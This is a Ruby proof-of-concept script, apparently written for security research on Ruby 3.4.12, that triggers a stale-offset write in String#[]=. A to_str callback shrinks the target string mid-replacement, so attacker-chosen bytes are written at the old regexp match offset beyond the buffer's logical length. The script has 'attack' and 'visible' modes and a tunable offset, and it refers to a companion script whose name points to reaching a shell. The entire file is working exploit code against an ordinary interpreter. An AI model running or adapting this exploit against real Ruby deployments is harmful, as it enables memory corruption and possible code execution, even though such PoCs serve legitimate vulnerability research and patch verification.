# Adjacent Ruby 3.4.12 -> 3.4.13 candidate (same fix series as
# CVE-2026-132825). vlen == len: the to_str callback returns three bytes, so
# the negative-size memmove of ruby2shell-backref-stale.rb is skipped and the
# chosen bytes are written at the stale regexp offset. Stock String#[]= only;
# no monkey patch, tracer, debugger or wire request. ARGV[0] = mode:OFFSET.
mode, offset_s = ARGV[0].to_s.split(":")
mode = "attack" if mode.nil? || mode.empty?
offset = Integer(offset_s || "700")

if mode.start_with?("visible")
  # Whole-buffer variant: N stale match bytes, receiver shrunk to N-1, N
  # chosen bytes written back. The N-1 in-length bytes are readable with
  # stock String#==; the Nth is one byte past the logical length.
  shrink = (mode == "visible")
  s = ("a" * offset + "d" * 200).dup
  repl = Object.new
  repl.define_singleton_method(:to_str) do
    s.replace("b" * (offset - 1)) if shrink
    "Z" * offset
  end
  begin
    s[/(a{#{offset}})/] = repl
    puts "ok len=#{s.bytesize} all_chosen=#{s == "Z" * (offset - 1)}"
  rescue => e
    puts "raised #{e.class}: #{e.message}"
  end
else
  s = ("a" * offset + "abc" + "d" * 300).dup
  shrink = (mode == "attack")
  repl = Object.new
  repl.define_singleton_method(:to_str) do
    s.replace("X") if shrink
    "ZQJ"
  end
  begin
    s[/abc/] = repl
    shown = s.bytesize <= 16 ? s.inspect : "#{s[0, 4].inspect}...(len=#{s.bytesize})"
    puts "ok len=#{s.bytesize} #{shown}"
  rescue => e
    puts "raised #{e.class}: #{e.message}"
  end
end
